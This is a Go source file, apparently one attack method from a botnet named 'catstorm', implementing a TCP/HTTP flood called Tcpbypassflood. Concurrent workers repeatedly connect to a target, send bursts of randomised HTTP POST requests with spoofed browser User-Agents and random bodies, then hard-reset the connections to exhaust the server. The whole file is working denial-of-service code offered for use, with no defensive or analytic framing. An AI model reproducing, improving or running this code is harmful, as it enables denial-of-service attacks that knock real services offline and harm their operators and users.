package l4

import (
	"context"
	"net"
	"strings"
	"time"
	"catstorm/Bot/Methods"
)

var hexCharsBP = "0123456789abcdef"

var tcpbypassPayloads [][]byte
var tcpbypassUAs = []string{
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.2 Safari/605.1.15",
	"Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 Version/17.2 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
}

func init() {
	rng := methods.NewXorShift64()
	tcpbypassPayloads = make([][]byte, 32)
	for i := range tcpbypassPayloads {
		sz := 256 + int(rng.Uint64()%1500)
		p := make([]byte, sz)
		rng.Fill(p)
		tcpbypassPayloads[i] = p
	}
}

func Tcpbypassflood(ctx context.Context, target, port string, sec int) {
	addr := net.JoinHostPort(target, port)
	workers := methods.Workers()

	for w := 0; w < workers; w++ {
		go func() {
			var sb strings.Builder
			rng := methods.NewXorShift64()
			for {
				select {
				case <-ctx.Done():
					return
				default:
				}

				con, err := net.DialTimeout("tcp", addr, 3*time.Second)
				if err != nil {
					time.Sleep(10 * time.Millisecond)
					continue
				}

				bursts := 10 + int(rng.Uint64()%30)
				for j := 0; j < bursts; j++ {
					idx := int(rng.Uint64() % uint64(len(tcpbypassPayloads)))
					payload := tcpbypassPayloads[idx]

					sb.Reset()
					sb.Grow(256 + len(payload))
					sb.WriteString("POST /")
					rx := rng.Uint64()
				sb.WriteByte(hexCharsBP[(rx>>0)&0xf])
				sb.WriteByte(hexCharsBP[(rx>>4)&0xf])
				sb.WriteByte(hexCharsBP[(rx>>8)&0xf])
				sb.WriteByte(hexCharsBP[(rx>>12)&0xf])
				sb.WriteByte(hexCharsBP[(rx>>16)&0xf])
				sb.WriteByte(hexCharsBP[(rx>>20)&0xf])
				sb.WriteByte(hexCharsBP[(rx>>24)&0xf])
				sb.WriteByte(hexCharsBP[(rx>>28)&0xf])
					sb.WriteString(" HTTP/1.1\r\nHost: ")
					sb.WriteString(target)
					sb.WriteString("\r\nUser-Agent: ")
					sb.WriteString(tcpbypassUAs[rng.Uint64()%uint64(len(tcpbypassUAs))])
					sb.WriteString("\r\nAccept: */*\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: ")
					cl := len(payload)
					if cl < 10 { sb.WriteByte(byte('0' + cl)) } else
					if cl < 100 { sb.WriteByte(byte('0' + cl/10)); sb.WriteByte(byte('0' + cl%10)) } else
					if cl < 1000 { sb.WriteByte(byte('0' + cl/100)); sb.WriteByte(byte('0' + (cl/10)%10)); sb.WriteByte(byte('0' + cl%10)) } else
					{ sb.WriteByte(byte('0' + cl/1000)); sb.WriteByte(byte('0' + (cl/100)%10)); sb.WriteByte(byte('0' + (cl/10)%10)); sb.WriteByte(byte('0' + cl%10)) }
					sb.WriteString("\r\nConnection: keep-alive\r\n\r\n")

					con.Write([]byte(sb.String()))
					con.Write(payload)
				}

				if tcp, ok := con.(*net.TCPConn); ok {
					tcp.SetLinger(0)
				}
				con.Close()
			}
		}()
	}
	<-ctx.Done()
}
